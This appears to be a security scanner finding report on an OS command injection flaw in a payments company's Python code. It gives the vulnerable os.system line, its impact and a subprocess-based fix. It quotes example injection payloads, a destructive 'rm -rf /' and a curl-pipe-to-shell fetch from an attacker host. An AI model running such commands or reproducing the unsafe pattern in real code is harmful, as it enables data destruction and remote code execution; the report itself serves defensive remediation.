# [CRITICAL] OS command injection via os.system

- **Finding ID:** sast-cmdinj-003
- **Scanner:** semgrep (SAST)
- **Rule:** python.lang.security.audit.dangerous-system-call.dangerous-system-call
- **Location:** `target/app.py:57`
- **CWE:** CWE-78
- **Verdict:** true_positive
- **Severity:** critical
- **Confidence:** 0.90
- **Recommended action:** draft_pr
- **Owner:** app-security / backend-team

## Business impact
An attacker could execute arbitrary OS commands on the server, potentially compromising customer data, payment systems, or the entire host.

## Reasoning
os.system() concatenates an untrusted 'host' value directly into a shell command with no sanitization or use of shlex.quote/subprocess with argument lists. This is a classic CWE-78 OS command injection pattern. If 'host' is derived from user input (e.g., a network diagnostic feature exposed via API/UI), an attacker can inject shell metacharacters (e.g., '; rm -rf /', '&& curl attacker.com/shell.sh | sh') to achieve remote code execution. Given this is a payments company codebase, RCE could lead to full compromise of cardholder data environment, secrets, and lateral movement. Even if reachability from an internet-facing endpoint isn't 100% confirmed from this snippet alone, the pattern is unambiguously dangerous and should be fixed regardless of current call site, since call sites can change. Confidence is high because the vulnerable pattern itself is unambiguous, though exact exploitability depends on how 'host' is sourced upstream.

## Remediation
Replace os.system with subprocess.run using a list of arguments (no shell=True), e.g. subprocess.run(['ping', '-c', '1', host], check=True). Additionally validate 'host' against a strict allowlist/regex (e.g., valid hostname/IP format) before use to defense-in-depth against injection.

## Offending code
```
os.system('ping -c 1 ' + host)
```
